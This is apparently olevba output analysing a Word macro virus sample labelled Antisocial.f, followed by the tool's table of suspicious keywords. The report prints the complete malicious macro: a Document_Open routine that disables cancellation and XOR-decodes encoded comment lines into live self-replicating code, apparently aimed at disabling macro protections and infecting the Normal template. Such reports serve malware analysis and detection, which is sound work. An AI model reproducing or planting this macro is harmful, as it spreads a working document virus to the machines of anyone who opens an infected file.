olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.f-82065eabc6b632f064b5968435b5e9ccae9ed73d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.f-82065eabc6b632f064b5968435b5e9ccae9ed73d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 28: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) Xor f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call ViewVBCode: End Sub
Private Sub ViewVBCode()
'1Nquhnor/R`wdOnsl`mQsnlqu!<!1
'1Nquhnor/BnoghslBnowdsrhnor!<!1;!Nquhnor/WhstrQsnudbuhno!<!1
'7Na'Jhiso/Ihp.':'67'Fic'Cf~/Ihp.':'66'Sobi'Jt`Eh'%HDS66*?7(K^T'NT'EKNTT%
'2Kd"Omlvj*Lmu+"?"32"Clf"Fc{*Lmu+"?"33"Vjgl"Glf
'1Rdu!BL!<!UihrEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd
'7Tbs'FC':'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb
'1Rdu!OU!<!Onsl`mUdlqm`ud/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd
'3Elq#g#>#5#Wl#1;9#@'#>#!!9#J#>#+@N-Ojmfp+g/#2**9#Qbmglnjyf#Wjnfq
'8n(5(Af| Zfl("(0!(#(92(Ngz(P(5(9(\g(Dmf A!2(J,(5(I{k Eal A$(P$(9!!(Pgz(n2(K,(5(K,(.(K`z J,!2(Fmp|(P2(I(5(K
'8\`a{Lgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm&ZmxdikmDafm(l$(*/*(.(n(.(I2(Fmp|(l
'6KE&;&EK(Johcu.7*&EK(EishrI`Johcu/
'4E@*@ahapaHmjaw$5($E@*GkqjpKbHmjaw>$E@*E``BvkiWpvmjc$IG
'8F\&Lmdm|mDafm{(9$(F\&Kg}f|GnDafm{2(F\&IllNzge[|zafo(EK
'4Egpmra@kgqiajp*WeraEw$BmhaJeia>9Egpmra@kgqiajp*BqhhJeia
'6O`&RnouBieskchr&;&HitkgjRckvjgrc&Rnch&Chb
'8An(Lgk}emf|{&Kg}f|(6(9(\`mf
'5H|v`ic%8%QmlvAjfph`kq+CpiiKdh`
'8Ngz(FGL(5(9(\g(Lgk}emf|{&Kg}f|
'6O`&Bieskchru(Orck.HIB/(@sjjHgkc&;&Kucj`&Rnch&AiRi&Ncjji
'6Qorn&Bieskchru(Orck.HIB/(PDVtilcer(PDEikvihchru(Orck.7/(EibcKibsjc
'2,FgngvgNklgq"3.",AmwlvMdNklgq8",CffDpmoQvpkle"OA8"Glf"Ukvj
'8Lgk}emf|{&A|me FGL!&[i~mI{(NadmFiem25Lgk}emf|{&A|me FGL!&N}ddFiem
'8@mddg2(Fmp|(FGL2(Mfl(An
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

